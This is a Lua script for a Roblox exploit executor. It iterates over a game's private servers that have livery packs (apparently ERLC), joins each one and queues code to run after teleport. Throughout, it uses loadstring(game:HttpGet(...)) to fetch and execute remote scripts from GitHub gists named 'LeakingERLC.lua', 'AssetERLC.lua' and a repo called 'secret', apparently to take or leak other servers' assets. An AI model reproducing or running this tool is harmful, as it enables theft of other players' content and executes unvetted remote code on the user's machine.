local httpService = game:GetService("HttpService")

local function getServerToJoin()
    local servers = httpService:JSONDecode(readfile("asset taker/servers.json"))
    local join = nil
    for key, val in pairs(servers) do
        if val == false then
            join = key
            break
        end
    end
    servers[join] = true
    _G.WindUI:Notify({Title = "getServerToJoin", Content = "Server: " .. tostring(join) .. " | Status: " .. tostring(servers[join]), Duration = 5})
    writefile("asset taker/servers.json", httpService:JSONEncode(servers))
    return join
end

local function joinServer(key)
    local q = queue_on_teleport or queueonteleport or queueteleport
    q(
        [[
            local q = queue_on_teleport or queueonteleport or queueteleport
            local c = clearqueueonteleport or clear_teleport_queue

            loadstring(game:HttpGet("https://gist.githubusercontent.com/qaxss/16f2ef9df02a7db32ae8ee178e886f67/raw/e17c27ca1e9254916471d4da4de5a580024e8e28/LeakingERLC.lua"))()

            q('loadstring(game:HttpGet("https://raw.githubusercontent.com/qaxss/secret/refs/heads/main/assets1.lua"))()')
            c()
            loadstring(game:HttpGet("https://gist.githubusercontent.com/qaxss/37c7651df0ab883ed0f800a385592dcc/raw/cc2c8f02da629265a1f0c7361e608af338b9e55c/AssetERLC.lua"))()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/qaxss/secret/refs/heads/main/assets1.lua"))()
        ]]
    )
    _G.WindUI:Notify({Title = "joinServer", Content = "Server Key: " .. tostring(key), Duration = 5})
    local j = game:GetService("ReplicatedStorage"):WaitForChild("PrivateServers"):WaitForChild("JoinServer"):InvokeServer(key, false, false)
    if j == "Success" or j == "Queue" then
        _G.WindUI:Notify({Title = "joinServer", Content = "Status: " .. tostring(j), Duration = 5})
    else
        local c = clearqueueonteleport or clear_teleport_queue
        local result = game:GetService("ReplicatedStorage"):WaitForChild("PrivateServers"):WaitForChild("LeaveQueue"):InvokeServer()
        _G.WindUI:Notify({Title = "joinServer", Content = "Result: " .. tostring(result), Duration = 5})
        c()
        _G.WindUI:Notify({Title = "joinServer", Content = "Result: " .. tostring(j), Duration = 5})
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qaxss/secret/refs/heads/main/assets1.lua"))() -- url for this code
    end
    task.wait(60)
    local c = clearqueueonteleport or clear_teleport_queue
    c()
    _G.WindUI:Notify({Title = "joinServer", Content = "Result: " .. tostring(j), Duration = 5})
    loadstring(game:HttpGet("https://raw.githubusercontent.com/qaxss/secret/refs/heads/main/assets1.lua"))() -- url for this code
end

local function checkServerList()
    makefolder("asset taker")
    local existingFiles = listfiles("asset taker")
    local out = {}
    local key = nil
    local found = false
    for _, file in existingFiles do
        if string.find(file, "servers.json") then
            found = true
            break
        end
    end
    if not found then
        local servers = game:GetService("ReplicatedStorage").PrivateServers.GetServers:InvokeServer()
        for _, server in pairs(servers) do
            if type(server) == "table" and server.LiveryPack and not server.Locked and server.TierRequirement == 0 and server.GroupJoin == 0 then
                out[server.CurrKey] = false
            end
        end
        writefile("asset taker/servers.json", httpService:JSONEncode(out))
    end
    key = getServerToJoin()
    joinServer(key)
end

checkServerList()
